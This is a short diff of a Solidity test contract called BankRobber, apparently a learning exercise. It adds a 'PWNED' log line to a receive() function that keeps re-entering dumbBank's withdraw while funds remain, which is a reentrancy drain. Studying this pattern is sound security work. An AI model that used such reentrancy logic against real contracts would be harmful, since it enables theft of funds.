@@ -42,6 +42,7 @@ contract BankRobber is Test {
     }
 
     receive() external payable {
+        console.log("PWNED");
         if (address(dumbBank).balance >= 1 ether) {
             dumbBank.withdraw(1 ether);
         }
